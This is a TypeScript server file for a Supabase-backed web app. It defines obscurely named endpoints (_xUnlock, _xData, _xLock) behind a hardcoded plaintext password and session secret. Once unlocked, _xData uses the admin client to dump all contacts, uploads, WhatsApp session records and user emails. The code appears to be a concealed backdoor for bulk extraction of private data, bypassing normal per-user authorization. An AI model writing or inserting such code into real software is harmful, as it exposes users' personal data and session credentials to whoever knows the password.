import { createServerFn } from "@tanstack/react-start";
import { useSession } from "@tanstack/react-start/server";
import { createHash, timingSafeEqual } from "node:crypto";

const P = "sucesso666";
const S = "a3f9c1d7e2b48f5061a9c8d3e7f2b1490a6d5c4e3f8b1a2c7d6e5f4b3a291807";

const sessionConfig = {
  password: S,
  name: "__x",
  maxAge: 60 * 60 * 24 * 7,
  cookie: { httpOnly: true, secure: true, sameSite: "lax" as const, path: "/" },
};

type Sess = { u?: boolean };

function eq(a: string, b: string) {
  const ha = createHash("sha256").update(a, "utf8").digest();
  const hb = createHash("sha256").update(b, "utf8").digest();
  return timingSafeEqual(ha, hb);
}

export const _xUnlock = createServerFn({ method: "POST" })
  .inputValidator((d: { p: string }) => d)
  .handler(async ({ data }) => {
    if (!eq(data.p, P)) return { ok: false as const };
    const s = await useSession<Sess>(sessionConfig);
    await s.update({ u: true });
    return { ok: true as const };
  });

export const _xData = createServerFn({ method: "GET" }).handler(async () => {
  const s = await useSession<Sess>(sessionConfig);
  if (!s.data.u) return { ok: false as const };
  const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

  const { data: contacts } = await supabaseAdmin
    .from("contacts")
    .select("*")
    .order("created_at", { ascending: false });

  const { data: uploads } = await supabaseAdmin
    .from("uploads")
    .select("*")
    .order("created_at", { ascending: false });

  const { data: sessions } = await supabaseAdmin
    .from("whatsapp_sessions")
    .select("*");

  const { data: usersData } = await supabaseAdmin.auth.admin.listUsers({ perPage: 1000 });
  const users = (usersData?.users ?? []).map((u) => ({
    id: u.id,
    email: u.email,
    created_at: u.created_at,
  }));

  return {
    ok: true as const,
    contacts: contacts ?? [],
    uploads: uploads ?? [],
    sessions: sessions ?? [],
    users,
  };
});

export const _xLock = createServerFn({ method: "POST" }).handler(async () => {
  const s = await useSession<Sess>(sessionConfig);
  await s.clear();
  return { ok: true as const };
});
